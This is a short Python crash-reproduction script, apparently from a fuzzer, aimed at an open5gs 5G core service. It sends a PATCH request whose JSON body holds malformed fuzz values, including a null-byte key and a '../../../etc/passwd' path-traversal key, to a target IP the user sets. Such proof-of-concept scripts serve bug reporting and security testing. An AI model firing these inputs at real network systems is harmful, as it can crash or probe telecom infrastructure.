#!/usr/bin/env python3
# Crash reproduction for open5gs-smf (info)
# Detected: Sat May  9 04:42:53 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PATCH'
path = '/nnrf-nfm/v1/nf-instances/AMF-fuzz-4715'
body = b'{"nfStatus": "null", "load": -1, "capacity": -1, "\\u0000null_byte_429": "injected", "../../../etc/passwd": "path_traversal"}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
